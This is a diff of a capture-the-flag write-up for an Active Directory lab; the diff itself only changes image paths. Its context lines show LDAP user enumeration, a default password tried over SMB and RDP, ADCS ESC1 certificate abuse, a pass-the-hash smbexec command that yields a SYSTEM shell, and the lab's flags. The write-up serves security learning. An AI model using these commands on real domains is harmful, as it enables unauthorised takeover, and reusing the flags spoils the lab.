@@ -180,12 +180,12 @@ nxc ldap labyrinth.thm.local -u 'guest' -p '' --users > users.txt
 
 We got `487` domain users:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250623195453.png)
+![](cybersecurity/images/Pasted%2520image%252020250623195453.png)
 
 Interesting part on here is that two users have this description:
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250623195543.png)
+![](cybersecurity/images/Pasted%2520image%252020250623195543.png)
 
 Let's begin exploitation.
 
@@ -208,7 +208,7 @@ nxc smb labyrinth.thm.local -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!'
 ```
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250623195817.png)
+![](cybersecurity/images/Pasted%2520image%252020250623195817.png)
 
 Both work for `smb`, `winrm` is not enabled on this machine but we got `rdp`, let's test for rdp then:
 
@@ -217,7 +217,7 @@ nxc rdp labyrinth.thm.local -u 'IVY_WILLIS' -p 'CHANGEME2023!'
 nxc rdp labyrinth.thm.local -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' 
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250623195958.png)
+![](cybersecurity/images/Pasted%2520image%252020250623195958.png)
 
 
 We know that Susanna can rdp, first of all, let's use bloodhound to check any PE path:
@@ -236,14 +236,14 @@ DETACH DELETE n
 
 Now, let's check up the data on bloodhound:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250624140039.png)
+![](cybersecurity/images/Pasted%2520image%252020250624140039.png)
 
 Sussana is member of `remote desktop users` as we know, important stuff comes here, if we check the relations of `users@thm.local`, we can find this:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250624140227.png)
+![](cybersecurity/images/Pasted%2520image%252020250624140227.png)
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250624140309.png)
+![](cybersecurity/images/Pasted%2520image%252020250624140309.png)
 
 We have a relation with `Certificate Service DCOM Access` group, which means we can interact with AD CS, meaning that if we find a misconfigured certificate, we can get an admin session, we can test this by going into rdp and checking which groups we are part of:
 
@@ -251,11 +251,11 @@ We have a relation with `Certificate Service DCOM Access` group, which means we 
 xfreerdp /v:labyrinth.thm.local /u:'SUSANNA_MCKNIGHT' /p:'CHANGEME2023!' /dynamic-resolution /clipboard /cert:ignore
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250624140904.png)
+![](cybersecurity/images/Pasted%2520image%252020250624140904.png)
 
 Now, let's check:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250624140937.png)
+![](cybersecurity/images/Pasted%2520image%252020250624140937.png)
 
 As seen, we can find the certificate groups, let's begin privilege escalation.
 
@@ -366,11 +366,11 @@ We find there's a `ESC1` vulnerability on the `ServerAuth` certificate template,
 
 ARTICLE: https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250624141454.png)
+![](cybersecurity/images/Pasted%2520image%252020250624141454.png)
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250624141526.png)
+![](cybersecurity/images/Pasted%2520image%252020250624141526.png)
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250624141549.png)
+![](cybersecurity/images/Pasted%2520image%252020250624141549.png)
 
 Basically, what we'd need to do is to request a certificate on behalf of the Administrator user, then, using that certificate, we'll be able to get a session as the admin user.
 
@@ -433,7 +433,7 @@ python3 smbexec.py -k -hashes :07d677a6cf40925beb80ad6428752322 THM.LOCAL/Admini
 C:\Windows\system32>
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250624144621.png)
+![](cybersecurity/images/Pasted%2520image%252020250624144621.png)
 
 We can finally get both flags and end the CTF:
 
@@ -447,6 +447,6 @@ THM{THE_BYPASS_IS_CERTIFIED!}
 
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250623203625.png)
+![](cybersecurity/images/Pasted%2520image%252020250623203625.png)
 
 
